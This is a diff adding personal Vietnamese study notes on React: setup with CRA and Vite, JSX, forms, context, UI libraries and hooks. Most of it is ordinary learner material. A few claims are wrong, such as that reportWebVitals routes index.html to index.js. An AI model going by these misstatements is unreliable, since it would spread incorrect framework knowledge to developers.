@@ -1,0 +1,704 @@
+ReactJS: 
+Mặc định k nhắc lại tất cả các thứ về React bị deprecated k còn ứng dụng trong tương lai. Mặc định các package works với React version18.
+
+-> Cài React qua bộ CRA
+React có 2 version 17 và 18, version17 có rất nhiều package hay mà bị k tương thích với version18. Khi dùng từng package cần ghi rõ tương thích version nào:
+Để cài version 18: npx create-react-app myapp
+Để cài version 17: npx create-react-app myapp -> xóa node_modules và package-lock.json -> sửa package.json thành:
+"react": "^17.0.2",
+"react-dom": "^17.0.2",
+"@testing-library/react": "^12.1.2",
+-> Chạy npm i
+-> Sửa index.js thành:
+import ReactDOM from 'react-dom';
+và
+ReactDOM.render(
+  <React.StrictMode>
+    <App />
+  </React.StrictMode>,
+  document.getElementById('root')
+);
+=> Các package tương thích version18 đa số vẫn dùng được trong version17.
+
+-> Cài React bằng Vite:
+yarn create vite or npx create-vite => npm i => npm run dev 
+Để đổi port chạy cổng 3000 chẳng hạn thì fix trong package.json thêm --port 3000 vào sau các script
+
+-> Dùng template khác của bộ CRA:
+npx create-react-app myapp --template typescript => cài react với typescript
+npx create-react-app myapp --template redux-typescript => cài react với typescript dùng thêm redux
+
+-> React thay đổi 1 số attribute của các thẻ có sẵn. Cơ bản có: label for => label htmlFor và class => className
+Còn có input value => input defaultValue nhưng ta ít khi dùng vì dùng hook useState ta cũng set được default value rồi. Còn rất nhiều thuộc tính khác: https://reactjs.org/docs/dom-elements.html
+=> Khi compile nó dịch sang html thuần từ className về class bth
+
+
+
+# Tính năng React18
+
+
+
+# Basic
+Trc h ta biết stateful component(class) và stateless component(function component). Nhưng như v sẽ phải loay hoay trong cái this, super, life cycle phức tạp. Sau đó lại còn phải bind các hàm nx. Ở phiên bản mới thì nó cho phép cải tiến k cần dùng constructor nx mà khai báo 1 biến luôn(chứ kp như ta tưởng dùng state hay biến bth đều đc đâu mà biến bth nó là phiên bản cải tiến của state, constructor, this của class đó); còn hàm bind ta thay thế bằng arrow function.
+
+React.StrictMode là 1 component hỗ trợ đánh dấu lỗi tiềm ẩn trong ứng dụng. Nó chỉ hoạt động trên môi trường development và không tạo phần tử mới trên DOM node
+
+Function k đối số là gán hàm, function truyền (params) là thành gọi function và lấy giá trị trả về
+
+-> Component:
+props của 1 component là bất biến theo, khi 1 component nhận được props thì nó sẽ k đổi được props của chính nó. Nếu nói đến việc đổi props thì chỉ có thể là cha truyền lại cho con 1 props khác.
+
+Có thể sử dụng react mà không render HTML trong component không? Có ta dùng return false/ []/ null/ <Fragment></Fragment>/ <></>
+
+Ta có thể re-render lại component khi kích thước trình duyệt bị đổi bằng cách bắt sự kiện resize và cho render lại. Điều này là k nên mà nếu cần đổi style gì, hãy dùng css
+
+-> Trong index.js
+Sở dĩ index.html k hề script tới file javascript nào nhưng chạy lên vẫn có file App.js là vì file reportWebVitals sẽ đóng vai trò là 1 router điều hướng link từ index.html tới index.js
+
+-> Bản chất tạo component React: 
+<component /> chuyển thành React.createElement('component') (html tag)
+<Component /> thành React.createElement(Component)
+<obj.component /> thành React.createElement(obj.component)
+=> component trong React muốn tạo phải viết hoa, nếu k sẽ hiểu là html tag
+
+-> Truyền hàm mặc định kiểu onChange={handleChange} thì hàm handleChange sẽ nhận biến event phát ra làm tham số, chỉ đúng trong react chứ js thì phải call hàm (params) luôn. Trong React thì onChange phát ra mọi lúc khi từng chữ được gõ vào input nhưng trong JS thì onchange chỉ phát ra khi gõ xong và ấn ra ngoài để xác nhận
+
+Để tránh lỗi sai, nên dùng arrow function inline or truyền mặc định mọi lúc
+Có thể console.log trong attribute ref để debug thì khi render đến thẻ đó sẽ hiện ra
+
+-> K nên dùng code React thuần: createElement
+
+-> Dùng Fragment còn lợi hơn div ở chỗ nó k tạo thẻ khi render ra nên chiếm ít bộ nhớ hơn.
+
+-> Các hàm khác của React: ReactDOM.render
+
+-> Phân biệt gọi hàm hay gán hàm khi truyền vào sự kiện; Phân biệt mọi thứ với this
+--> Dùng sự kiện: như JS nhưng camelkey
+---> onChange: phát ra mọi lúc khi gõ text chứ kp chỉ khi gõ xong như JS thuần
+---> onMouseEnter: có thể dùng thay cho :hover của css để làm các animation phức tạp
+
+-> Truyền vào component các attribute bằng ...
+
+-> Có thể thêm style thuần css dạng component trong React
+
+-> Trong React có sẵn prop-types định nghĩa type của các props để làm API cung ra cho các component sử dụng
+
+-> Dùng React với html thuần
+=> refer tới "Projects / Solatex / Dùng react thuần
+
+
+
+# Dùng localStorage
+Có thể dùng localStorage làm global store lưu trữ mọi thứ nhưng k thể thay thế cho redux bởi vì nếu gọi setItem thì state của component k đổi và k render lại, kèm với bộ nhớ nhỏ.
+Do đó pattern thường dùng là vẫn lưu data trong localStorage vào redux, mỗi khi gọi setItem cho localStorage thì lại gọi lại getItem để update data vào redux
+
+=> refer "Thao tác với JSON" của Tổng kết module JS
+
+
+
+# Code JSX:
+Thực chất file jsx ta code JS như bth, chỉ là React cung thêm các hàm như createElement mà có thể được thay thế bằng các đoạn code JSX trong cặp () mà thôi, tool babel sẽ biên dịch từ trên xuống thành JS cho browser xử lý. Nếu chỉ có 1 dòng thì k cần (). Sinh ra 1 kiểu biến mới lưu component của React.
+
+Dùng map(ele => (thẻ jsx)) nếu muốn return luôn thẻ JSX
+
+-> Nếu log thẻ của React sẽ ra type Symbol(react.element), type này có thể dùng trực tiếp trong {} để hiển thị thẻ. $$typeof kiểu Symbol
+
+-> Các thuộc tính của style có thể dùng camelkey or JSON object với css thuần. 
+VD: fontSize: "2rem" or "font-size": "2rem" đều được => Với các thuộc tính dài or lạ thì nên dùng dạng JSON object
+
+-> HTML entity trong JSX
+HTML entity là cú pháp được dùng để biểu diễn các ký tự đặc biệt hoặc được bảo lưu trong HTML. VD &lt; là 1 HTML entity. Trong HTML nó hiện như bth, trong jsx cx hiện như bth, nhưng nếu HTML entity đc dùng trong string thì JSX sẽ k hiện, khi đó ta buộc dùng hàm `${String.fromCharCode()}`. thực chất entity html cx chỉ là char code
+
+-> Câu điều kiện trong JSX: ?:, đoản mạch, dùng mẹ if else trong { } được
+-> Spread syntax dùng cho JSX để truyền tất cả props cha cho con
+
+
+
+# Về font chữ:
+Cài font: yarn add @fontsource/roboto; import "@fontsource/roboto"; => font chữ cx add vào npm thoải mái => dùng với font-family: "Roboto". Nhưng thường ta k dùng như v mà với font của google API có thể thêm trực tiếp vào file public/index.html phần header lấy tag(CDN) từ trang web của google font api
+
+Khi dùng font chữ link về của google thì k có hêt font-size và font-weight, nên ta set font-size cho nó k có tác dụng. Nó chỉ hiện ra đúng các loại font mà ta link về thôi. Ta phải link tất cả các font-size đúng để set css được. VD:
+<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600&display=swap" rel="stylesheet">
+thì ta chỉ có thể set được font-weight: 200, 300, 400, 600 -> các style khác sẽ k hiện
+
+-> refer tới "# Dùng font" của Tổng kết module HTML, CSS
+
+
+
+# Cách ref tới 1 thẻ trong component
+-> Nếu thẻ đó có sự kiện như onClick thì ta có thể lấy mọi thông tin của thẻ đó luôn. VD event.target.innerText
+
+-> Chủ động dùng hook var ref = useRef(null); rồi cho vào attribute ref của thẻ
+
+-> Nếu có biến lưu các thẻ thì có thể truy cập mọi thứ của thẻ thông qua biến, lưu 1 list thẻ thì nó như 1 mảng thôi
+
+
+
+# Dùng list trong React
+-> Dùng list buộc phải có key. Ta nên có 1 id duy nhất cho mỗi phần tử, còn dùng index chỉ là TH cơ bản k phải thao tác xóa hay thay đổi các thứ nếu k có thể lỗi
+key cho element phải được dùng trong phạm vi có mảng và tạo ra element đó. VD component đó tách thành 1 hàm riêng thì kp gọi key ở trong hàm đó mà phải gọi lúc có mảng gọi hàm map chẳng hạn ấy.
+
+-> Khi tạo list ta dùng key nhưng từng item của list lại tách thành component riêng thì trong component đó k dùng được props.key vì key dùng cho list cho mục đích riêng, k dùng tiếp được như 1 thuộc tính ở từng items
+
+
+
+# Thao tác với form
+-> Ta có thể gom tất cả trường thay đổi của form vào 1 biến const [state, setState] = useState object duy nhất thì có thể gom tất cả hàm onChange của mọi input vào 1 hàm handleChange duy nhất bằng cách đặt thêm trường name trùng với key của object kiểu:
+setState({
+    ...state,
+    [e.target.name]: e.target.value
+});
+Bởi vì khi 1 trường thay đổi thì đằng nào cả component chả render lại. Nhưng điều này là k cần thiết vì dùng nhiều biến useState cũng chả sao và có thể viết onChange inline được rất tiện
+=> Nhớ key của object thì x tương đương với ["x"]
+
+-> Trong JS, return false trong hàm xử lý sự kiện sẽ ngăn chặn chuyển trang nhưng trong React thì dùng e.preventDefault() dù đây vẫn là hàm của JS. Nó có thể áp dụng trong form hoặc bất cứ component nào gây chuyển trang. Vd thẻ a có href có thể xử lý điều này trong onClick của nó
+
+-> Để submit form thông qua phím enter
+Cách 1 ta dùng onSubmit của form là xong, có button nào submit thì cho type submit là được, phải xử lý e.preventDefault();
+Cách 2(k nên) là ta dùng chay với button onClick thì cũng chả cần form và e.preventDefault nhưng muốn ấn enter thì lại phải bắt sự kiện phím bấm và check là phím enter thì submit lằng nhằng
+
+
+
+# Thao tác với thẻ con
+Khi component Cha lồng nhiều con nhưng tách riêng Cha sang 1 component riêng thì Cha có thể quyết định hiển thị con như thế nào, or nếu Cha k cho return hiển thị con thì con sẽ k được hiển thị
+
+-> Mặc định mọi component Cha sẽ có props.children là các thẻ con. Nó theo cơ chế phân cấp VD con có con nữa thì lại props. VD: props.children[1].props.children là mọi chilren của con thứ 2 của Cha
+
+props.children là read-only nên k chỉnh sửa được các component, nếu children chỉ có 1 phần tử, nó k trả ra dạng mảng mà trả ra 1 object nên dùng map có thể gây lỗi
+
+Từ component Cha có thể: 
+- Lấy các con nên ta có thể thêm các style className cho con trực tiếp. Có hàm cloneElement thì ta có thể copy con ra 1 component riêng và thêm các attribute khác cho nó cũng tương tự thôi.
+- Dùng if else quyết định con nào hiện ra và con nào không. VD thêm trường name cho từng con và trong Cha ta check name == gì thì làm gì; 
+=> 1 số hạn chế vẫn chưa giải quyết được như k sửa được innerText nhưng ta có thể thêm text bằng cách thêm các thẻ khác vào. Nhưng thông thường ta k cần dùng đến cloneElement hay chỉnh sửa innerText, nếu cần dùng chứng to cấu trúc dự án của ta có vấn đề 
+
+-> React.children cung các hàm để dễ thao tác hơn với props.children
+VD: hàm map của nó sẽ tự động thêm key và dùng được mọi lúc kể cả props.children chỉ có 1 element
+only(1 element) sẽ check 1 element có phải là React element hay không và return nó, k thì báo lỗi
+toArray chuyển sang array và mỗi phần tử sẽ có 1 key riêng
+forEach cũng như map nhưng k return array và ốp đổi luôn mảng
+cloneElement(ele,props,children) cũng như là <element {...element.props} {...props}>{children}</element> bằng jsx truyền attribute cho 1 thẻ
+React.isValidElement(<ele>)
+
+
+
+# Dùng context
+Context là 1 công cụ giúp truyền 1 phát từ ông sang cháu luôn là k truyền qua props của cha từng level hàm tạo 1 context. Context có thể truyền vào hàm số để component Con dùng cx đc
+Context ít dùng vì nếu có thể, người ta dùng redux or redux có sẵn trong React với useReducer. 1 số code họ vẫn dùng Context, họ chơi hẳn 1 context lớn trong file index js bao tất cả mọi thứ nên nó tạo biến global chả khác gì redux cả nhưng tính năng k bằng. Với các dự án nhỏ có thể dùng thuần context mà k cần redux cũng được. Chẳng qua redux cung cách thức code, fetch API, bất đồng bộ saga thunk, debug middleware rất mạnh nên phù hợp với các dựa án lớn hơn thôi.
+
+Pb: useContext giúp chia sẻ state tới các component, userReducer cho phép cập nhật giá trị mới cho state. 
+
+-> Cách dùng: dùng createContext để tạo Context riêng -> dùng Context.Provider cung giá trị attribute cho nó ở component Cha. Thg truyền vào biến state cho component Provider của Context
+1) Con dùng context bằng cách gán Con.contextType = Context; -> truy cập thông qua biến this
+Functional component trong React k có biến this nhưng class component vẫn có biến this nên cách 1 chỉ áp dụng với class component nên éo bh dùng
+
+2) Con dùng context thông qua Context.Consumer => Chỉ dùng trong code JSX hay truyền qua GrandChild vào props nữa
+
+3) Con dùng useContext => ok hết
+
+-> createContext truyền vào default value và nếu Consumer tìm bên trên k có provider nào đúng thì mới lấy GT default
+Context.displayName đặt tên cho context chỉ hiển thị trong devtool
+Bên trong Context.Consumer phải là 1 hàm số trả ra thẻ cần lấy
+
+=> Bh người ta dùng redux chứ k dùng context nữa, với các dự án test nhỏ vẫn có thể dùng context cho nhanh đỡ phải setup redux mất tg
+
+-> Giải quyết vấn đề về rerender khi context đổi thì con render lại và cha dùng Provider đổi thì con cũng render lại: dùng useMemo cho Con; mỗi Con cho 1 context riêng
+
+
+
+# Module Bootstrap
+Tương thích với React18
+
+-> Cài đặt
+react-bootstrap là thư viện bootstrap được xây dựng lại bằng react, làm cho giao diện đẹp hơn. Nó trở thành các component react. Trong ứng dụng của ta vẫn có thể dùng bootstrap bình thường .js và .css nhưng ta nên kết hợp cả react-bootstrap cho react sẽ ok hơn.
+Để cài: npm i react-bootstrap bootstrap
+Để dùng bootstrap bình thường ta cần thêm jquery và proper.js=> npm i --save jquery popper.js
+=> Dùng tiếp như cdn với: 
+import '../node_modules/bootstrap/dist/css/bootstrap.min.css';
+import 'bootstrap';
+import 'jquery';
+import 'popper.js';
+=> Các thư viện mà ta k cần import các Component mà chỉ style như kiểu css thì chỉ cần import '<tên package install>'; là đủ. Còn các thư viện cung component React thì ta phải import kiểu VD thêm component: import { Button, <> } from 'react-bootstrap'; 
+=> Thực chất import "tên package"; sẽ tự import tất cả file JS CSS cho ta. VD:
+import 'react-bootstrap'; => import mọi file JS CSS nhưng k nên vì nó k dùng hết tất cả mà chỉ vài component thôi
+import Button from "react-bootstrap/Button"; => đây là import từng cái 1
+import { Button, Alert, Breadcrumb, Card, Form, Container, Col, Row } from 'react-bootstrap'; => nên dùng nhất
+
+-> Ta có thể dùng bootstrap thuần hay các component đều được 
+Các component thường dùng: 
+Container fluid
+Row, Col dùng được responsive
+Form: đi với Form.Group, Form.Label, Form.Control, Form.Text
+Card: đi với Card.Img, Card.body, Card.Title, Card.Text, Card.Subtitle
+Breadcrumb: có Breadcrumb.Item
+Button, Alert,...
+
+
+
+# Loading icon
+-> Trang: https://github.com/n3r4zzurr0/svg-spinners tổng hợp các loại loading icon cơ bản dạng svg sẵn. Ta có thể copy và thêm trực tiếp vào dự án, kẹp trong thẻ SVG và chỉnh width, chỉnh màu thoải mái
+
+
+
+# Các loại mock data
+-> 1 bức ảnh: https://picsum.photos/200/300
+
+
+
+# Module senmatic ui react
+Đặc điểm thư viện ui này là nhìn giao diện khá đơn giản nhưng lại cung sẵn 1 vài hiệu ứng rất mạnh. 1 số đặc điểm như hover vào thì thường đổi hình hoặc hiện ra gì đó khác. Tương thích với React18.
+
+-> Cài đặt: npm install semantic-ui-react semantic-ui-css => dùng import 'semantic-ui-css/semantic.min.css'; 
+Sau đó dùng component nào thì import từng cái vào. VD: import { Pagination, Container, Grid, Input, Segment } from 'semantic-ui-react';
+
+-> Vài component: Container, Pagination, Grid, Input, Segment
+Dùng Pagination truyền mặc định vào onChange thì tự động truyền vào e và pageInfo vào hàm đó chứa mọi thông tin
+
+
+
+# Tạo pagination
+2 case thường dùng:
+-> Ta lấy tất cả dữ liệu về trước từ lúc mới vào và lưu vào redux, sau đó chuyển trang như nào thì cho hiển thị dữ liệu nào đén dữ liệu nào. Tổng số page tự tính ra còn page hiện tại phụ thuộc vào người dùng chọn
+=> Thường dùng khi fetch data từ web3 trực tiếp vì nó k hỗ trợ filter, search, khi đó buộc phải fetch tất cả về r tự lọc. 
+Thực chất web3 đôi khi dữ liệu lấy về k lớn thì vẫn dùng được cách 2. VD 20 phần tử mỗi page 4 phần tử. Chứ có 1000 phần tử thì thôi
+
+-> Ta bấm đến đâu thì fetch đến đấy bằng cách tạo ra url query string có chứa total page và số page hiện tại ở phía server, server khi trả ra data cũng phải trả thêm thông số đó. Phía redux lưu config page và mỗi khi đổi page thì đổi config trong redux. Bản hiển thị dữ liệu check config đổi thì fetch rồi hiển thị ra
+=> Thường dùng khi fetch data từ server tập trung, khi ta kiểm soat hoàn toàn mọi thứ
+
+
+
+# Dùng HOC
+HOC được dùng nhiều trong dự án react dưới dạng component wrapper
+
+Higher Order Component(HOC) là 1 component nhận đầu vào là 1 component và trả ra 1 component khác-> sử dụng logic đó cho nhiều component khác nhau tránh vc trùng lặp code
+
+
+
+# React hook cơ bản
+React Hook làm cho mọi thứ đều dùng function, k còn class nx và sự phụ thuộc dữ liệu, chia sẻ logic trở nên đơn giản.
+=> dùng react hook thì tất cả this,super,lifecycle,state trong class kiểu cũ đều bỏ, cx k cần kế thừa React.Component làm kích thước bundle giảm nhẹ.
+Mọi thứ như là life cycle, đổi state, fetch dữ liệu, cập nhập cây DOM-> đều là đồng bộ hóa. Ta muốn 1 số ở chỗ này thay đổi thì những data ở chỗ nào thay đổi. react hook sẽ gom những data liên quan lại với nhau và hình thành 1 cú pháp đơn giản để 1 cái đổi cái khác tự động kiểm tra và đổi. 
+
+K dùng hook trong hàm js regular, chỉ dùng hook ở top level. K dùng trong câu đk, hàm con, loop.
+
+Ta chỉ nên dùng hook ở top level vì chẳng hạn dùng trong câu điều kiện, nếu false thì lần đó nó k thực hiện nx, song các hàm khác bên dưới lại dùng dữ liệu của cái hook đó song éo có dữ liệu dẫn đến lỗi lung tung. Chính vì v nếu muốn dùng hook để run 1 condition -> nhét logic đó vào trong 1 hook chứ đừng nhét hook ngoài top-level
+
+-> Dùng useState:
+Trả ra 1 mảng 2 phần tử ta tùy ý lấy
+Nếu ta gọi hàm set nhưng truyền lại đúng biến cũ thì React đủ thông minh để k render lại, nhưng cho chắc, nó vẫn sẽ lưu giá trị đó lại và render lại 1 lần, nếu lần sau tiếp tục đổi lại vẫn bằng giá trị cũ thì nó mới ngừng render hoàn toàn. Với quy tắc như v, tiêu chí để check setState có set giá trị mới không là nó so sánh tham chiếu, tức nếu truyền object, mảng, hàm với giá trị y hệt nó vẫn coi là khác nhau và render lại
+
+Hàm setState ngoài set trực tiếp còn có thể viết dưới dạng 1 hàm nhận vào state. VD: setState(state + 1) tương đương setState(state => state + 1) nhưng cách truyền vào hàm đúng hơn vì state luôn mang giá trị mới nhất ở future => ref tới "Tạo đồng hồ đếm ngược bằng hook"
+
+-> Dùng useEffect: 
+useEffect run sau khi kết thúc lần render đầu tiên và mọi update trong component về sau, nó thực hiện từ trên xuống nhưng khi gặp useEffect sẽ lưu lại và chờ return DOM cập nhập xong sẽ thực hiện hàm bên trong useEffect. Tức tại thời điểm chạy DOM đã đc cập nhập dữ liệu phụ thuộc rồi và lần gán đầu tiên coi là 1 thay đổi và chạy useEffect lần đầu luôn. [<>] quyết định phụ thuộc vào cái gì, k có đối số 2 thì mọi thay đổi đều render lại.
+VD: nếu useEffect đổi 1 biến r lại phụ thuộc biến đó [] thì sẽ lag vô tận
+
+K thể lồng 1 hook call vào bên trong useEffect or useMemo
+
+Dùng return thì bắt buộc return 1 FUNCTION để unmount, thực hiện clean up nếu có, mặc định return undefined. Chỉ đc return 1 trong 2 thứ: undefined or function thực hiện clean up.
+Hàm return của useEffect chỉ đc chạy khi đến lúc cần clean up(tức kp return luôn) và có 1 quy tắc là khi 1 hàm useEffect đc gọi, nó sẽ clean(gọi vào return) cái useEffect trc nó r mơi thực hiện useEffect mới. 1 quy tắc nx là khi component unmount cũng sẽ tự thực hiện clean up gọi return, đó có thể là khi component k được render ra nữa vì chuyển sang 1 router khác
+
+Dependency của useEffect phải là biến của component này vì nó k bắt sự thay đổi nếu biến ngoài đổi giá trị
+
+Trong useEffect k thể gọi luôn 1 hàm asynchronous được để tránh race condition, do đó muốn gọi phải lồng vào 1 hàm sync.
+
+Trong saga ta có thể ngắt quãng 1 hàm fetch đang gọi dở và thực hiện 1 hàm fetch mới tương tự. Khi dùng 1 hàm fetch trong useEffect hay bất cứ chỗ nào khác, ta k thể cản khi nó đang thực hiện dở được. Ta chỉ có thể để nó tiếp tục fetch xong quyết định có dùng data lấy về hay là bỏ đi bằng cách dùng thêm 1 biến boolean để check
+
+Khi dùng useEffect k truyền gì như này vào đối số 2, nó sẽ luôn luôn được chạy sau khi hàm này được gọi bất kể state của functional component này có đổi hay không. Nó tương đương với việc viết trực tiếp vào hàm v nhưng điểm khác là nó thực hiện sau khi component chạy xong
+
+--> Dùng useEffect với setInterval: dùng setInterval trong useEffect và return thì clearInterval thực chất nó tạo và xóa interval liên tục
+
+--> Lỗi của useEffect
+Chú ý là useEffect đc chạy sau khi render DOM đã đc cập nhập và cả lần render đầu tiên -> tức là ta tưởng mọi giá trị ta nhìn thấy đã render là mới nhất nhưng thực ra có vài giá trị đặc biệt đã update nhưng k hiện ra vì nó kp state props nên k gọi render lại
+Bc là như v dẫn đến 1 số Th hiếm hoi gây lỗi: ví dụ ta cho useEffect thì thay đổi 1 biến và hiển thị ra màn hình. Thông thường thì k sao hết nhưng nếu biến kia là state vì đổi state sẽ dẫn đến chạy lại hàm và in ra giá trị mới luôn. Nhưng nếu biến đó là global chẳng hạn thì hàm k render lại nên phải chờ đợt render lần sau mới hiện ra màn hình. Lỗi này ít xảy ra
+
+Khi setState trong useEffect nó k đổi ngay mà giá trị vẫn như cũ và tiếp tục chạy đến hết hàm useEffect r kích hoạt render lại, khi render lại đến hàm useState của nó thì giá trị nó mới được update. Còn trước hàm useState thì nó coi giá trị undefined chưa tồn tại
+
+--> Tạo đồng hồ đếm ngược bằng hook => usecase giúp hiểu bản chất useState, dùng setInterval trong useEffect, tổng hợp mọi thứ
+=> Cách tốt nhất vẫn là dùng useRef nhưng trong dự án thực tế, ta tính toán sự chênh lệch time liên tục chứ k để phụ thuộc vào máy có lag hay không
+
+-> useLayoutEffect
+useLayoutEffect là 1 hàm giống useEffect nhưng thực hiện trc useEffect ngay sau khi render lên DOM. Ta có thể thay thế useEffect bằng useLayoutEffect nhưng chả để làm gì cả -> họ khuyên ta nên dùng useLayoutEffect khi cần thao tác với DOM mới cập nhập và các biến state vẫn còn là giá trị cũ đó, chưa bị gọi vào useEffect set state giá trị mới vì có thể ta cần dùng GT cũ làm gì đó.
+
+-> Dùng useReducer
+Cơ chế đơn giản hơn redux: dispatch -> reducer thực hiện -> state của reducer chính là state trong useReducer
+Nếu dùng, ta nên tách ra thành file riêng export ra reducer
+
+useReducer thực chất giống useState, ta dùng khi component cần quản lý state 1 cách rõ ràng hơn. 
+Vd1: Ta dùng 1 vài biến useState phụ thuộc lẫn nhau trong 1 số TH như case đơn giản post, error, loading thì tất cả có thể nhét vào 1 reducer thôi => ít vào case này vì thường chỉ khi fetch trực tiếp trong hàm chứ k người ta sẽ dùng redux luôn
+Vd2: Khi 1 biến state mà có nhiều trường, đặc biệt là nested object hay array thì việc update nó phải viết nhiều hàm phức tạp hay kể cả ta đã gom nó với {...state, [name]: value} thì cũng nên dùng useReducer đỡ loạn => ít vào case nàys
+
+-> Bản chất stable value trong React:
+Các thứ tạo bằng hook hầu hết là stable value. Vd useFocusEffect của React Navigation của ReactNative thì k là stable value. Đã là stable value thì k tạo lại khi rerender. Ta nói stable value tức là các giá trị được gán bởi hàm hook trực tiếp. VD: const a = useCallback(b,[]); thì a là stable vì được gán trực tiếp, b là unstable và b sẽ tạo lại mỗi lần rerender.
+Các biến hay hàm const tạo bth trong FC đều là unstable.
+Có hook cần list dependencies như useEffect, useCallback, useMemo. Khi đó các dependecies của nó phải là stable value, nếu k sẽ gây giảm performace rất nhiều. VD khởi tạo 1 biến const bth trong FC và truyền vào làm dependencies. Mọi lần rerender nó đều tạo lại biến const đó thì các hook sẽ luôn chạy mỗi lần rerender là hỏng.
+
+Bản chất khi data được lưu lại bằng các loại hook này, nó lưu trong cache cho đến khi dependencies thay đổi thì xóa khỏi cache và thêm cái mới vào cache tiếp thôi.
+
+--> Vấn đề về khởi tạo 1 component trong 1 component khác:
+const A = () => {
+  const [c, setC] = useState(false);
+  const B = () => {
+    if(c) return <X/>;
+    else return <Y/>
+  }
+  // Cách 1:
+  return <> <B/> </>
+  // Cách 2:
+  return <> {B()} </>
+}
+=> 2 cách này dùng ok nhưng k tốt về mặt design, ta nên cho B làm 1 component độc lập global bên ngoài nhận c làm props thôi. Cả 3 cách khi A rerender đều tự render lại nhưng k vấn đề gì. Nếu component quá lớn or phức tạp mới nên thêm useMemo
+
+
+
+# Dùng useMemo useCallback
+Trap: 1 component render lại or nói là 1 function component thực hiện lại từ trên xuống r render ra màn hình bất cứ khi nào props, state của nó thay đổi. Khi đó bất cứ thuộc tính nào thay đổi cx đều bị render lại sẽ tạo mới biến và fuction để sử dụng -> giảm performance khi render. Nó tạo lại biến mới hoàn toàn, chạy lại các giá trị gán vào biến chứ k chủ động dùng lại biến cũ kể cả là biến const, nó xóa và tạo lại. Nhưng như v lại tối ưu hơn là dùng thêm useCallback, useMemo vào.
+
+-> Phân biệt useEffect chạy hàm gì khi param2 thay đổi giá trị. Nó gọi return khi cần thiết.
+
+-> useCallback trả ra hàm nào vào biến mỗi khi param2 thay đổi
+
+-> const Con = React.memo(props => { return <>; }); chỉ khi props đổi mới chạy lại hàm render lại Con
+
+-> useMemo chạy hàm gì khi param2 thay đổi và lấy giá trị return của hàm gán cho biến. Chức năng giống useCallback nhưng dùng được với mọi type.
+VD: useMemo có thể thay thế useCallback nếu ta cho return giá trị là 1 function. Nhưng useMemo k thể gọi lồng 1 use hook khác bên trong. Người ta khuyến khích là hàm dùng useCallback còn mọi thứ khác dùng useMemo. 
+React.memo thì toàn bộ props vào chỉ cần đổi phát là chạy lại luôn, còn React.useMemo mạnh hơn vì ta cho rõ đc phần tử nào đổi thì mới đổi toàn quyền qđ vì nó có tc của hook. useMemo cũng thay thế cho React.memo được luôn
+
+Hook chỉ được dùng trong 1 component nào đó(1 hàm số or 1 class) chứ nếu gọi riêng thì lỗi ngay nên dùng useMemo để tránh 1 component k rerender thì phải nhét vào 1 function còn React.memo cho case này có thể dùng trực tiếp
+
+-> Vấn đề khai báo biến const trong hàm và ta muốn biến này có thể thay đổi
+function CandyDispenser() {
+  const initialCandies = ['snickers', 'skittles', 'twix', 'milky way'];
+}
+=> Để tránh mỗi lần render nó tạo lại ta dùng:
+function CandyDispenser() {
+  const initialCandies = React.useMemo( () => ['snickers', 'skittles', 'twix', 'milky way'], [] )
+}
+Bởi vì hàm số trong useMemo k được tạo lại khi rerender như callback, mà nó chỉ chạy lại khi dependencies thay đổi. Cách này k tốt vì ta tạo ra 1 function call kèm code dài hơn nhưng performance tăng chả bõ gì. 
+=> Cách fix perfect:
+const initialCandies = ['snickers', 'skittles', 'twix', 'milky way']
+function CandyDispenser() {
+  const [candies, setCandies] = React.useState(initialCandies);
+}
+Thì sẽ kbh rerender lại nữa, nếu biến const vĩnh viễn kbh đổi thì khai báo ngoài hàm luôn là được
+
+-> Usecase dùng useMemo useCallback
+Khi có Referential equality với object, mảng or hàm
+Computationally expensive calculations
+=> chính vì v mới ít khi thấy người ta dùng 2 cái này
+React.memo hay useMemo cũng dùng cho các <Con/> khi ta k muốn render lại Con khi Cha render lại
+
+
+
+# Dùng về ref
+Biến const tạo bởi useRef khi đổi sẽ k làm component render lại, chỉ props và state thôi
+Biến ref luôn bắt theo giá trị mới nhất của component, còn hiện ra như nào thì tùy component render lại k
+
+useRef cũng tạo ra object là constant, khi rerender sẽ k tạo lại và đặc biệt là sửa nó cũng k gây rerender, khác hẳn với tất cả các loại hook khác.
+
+-> Dùng useRef giúp lấy ref 1 thẻ nào đó của component hiện tại để thao tác gì đó với thẻ trong hàm.
+Tương tự với createRef nhưng nên dùng hook hơn vì hook có nh ưu điểm VD như nó kbh khởi tạo lại.
+
+-> Dùng forwardRef: nhận vào hàm số (props, ref) => (<jsx component>)
+Tham số thứ 2 nó nhận vào là ref mà ta có thể dùng để refer tới thẻ nào bên trong, các thẻ dùng component này có thể thao tác với biến ref. 
+=> Điểm lợi hơn bth là ta tái sử dụng nhiều nơi component này mà tự dưng muốn khác đi 1 thẻ thì dùng ref refer đến thẻ DOM đo để thay đổi thoải mái.
+
+-> Dùng useImperativeHandle
+=> Dùng khi cần đến độ tách 1 component riêng nhưng lại cần ref đến nhiều thẻ bên trong chứ k chỉ 1 và tái sử dụng component ở nhiều nơi.
+
+=> Thông thường ta k dùng đến forwardRef hay useImperativeHandle vì nếu muốn dùng 1 component nào mà thay đổi thuộc tính bên trong ta sẽ viết logic ở con bằng cách truyền vào props chứ k viết logic ở cha bằng cách lấy ref như v. Cùng lắm là ta dùng useRef mà thôi
+
+
+
+# Custom hook
+Custom hook cũng chỉ là 1 function nhận đầu vào và trả ra 1 giá trị đầu ra tự động biến đối theo đầu vào. Để đầu ra đổi theo đầu vào thì bên trong có thể dùng useEffect [<đầu vào>]. Đặt để tái sử dụng ở nhiều nơi.
+Custom hook nên có use ở đầu để React tự check các violation với quy tắc các hook của React. Thật ra 1 hàm số dùng hook use nhưng lại k return ra 1 component mà return ra 1 giá trị thì React vẫn hiểu hàm số đó là 1 custom hook.
+
+Thông thường custom hook dùng để cung ra 1 chức năng nào đó và nội dung của nó chỉ tập trung cung ra chức năng đó thôi. Cho nên code của nó rất ngắn gọn và bên trong k xử lý logic thừa. Cho nên 1 lời gọi trực tiếp custom hook trong 1 hàm sẽ chạy lại cả hàm custom hook đó và return lại giá trị nhưng nó vẫn tuân thủ nguyên tắc của 1 FC là k render lại các biến const useState hay useEffect dù các biến const khác vẫn xóa tạo lại nhưng performance k đáng kể
+Vc nó chạy lại customhook là đúng, k nên wrap nó vào useCallback lại càng tốn tài nguyên
